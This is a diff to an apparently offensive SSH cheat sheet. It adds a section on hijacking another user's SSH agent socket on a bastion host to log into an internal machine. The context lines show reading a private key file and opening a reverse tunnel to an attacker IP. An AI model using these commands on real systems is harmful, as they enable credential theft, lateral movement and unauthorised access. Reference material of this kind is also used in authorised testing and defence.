@@ -58,6 +58,20 @@ cat /mnt/jane/.ssh/id_rsa
 ### Dynamic Port Forwarding
 * `ssh -D <local proxy port> -p <remote port> <target>`
 
+### Socket Hijack
+
+From: https://twitter.com/REPTILEHAUS/status/1347103391961505792
+
+```
+root@bastation: $ find /tmp/ssh-* -type s
+/tmp/ssh-srQ6Q5UpOL/agent.1460
+
+root@bastation: $ SSH_AUTH_SOCK=/tmp/ssh-srQ6Q5UpOL/agent.1460 ssh user@internal.company.tld
+
+user@internal: $ hostname -f
+internal.company.tld
+```
+
 ### Proxychains
 * First create a reverse tunnel from victim to attacker
     * `ssh -f -N -R 2222:127.0.0.1:22 root@208.68.234.100`
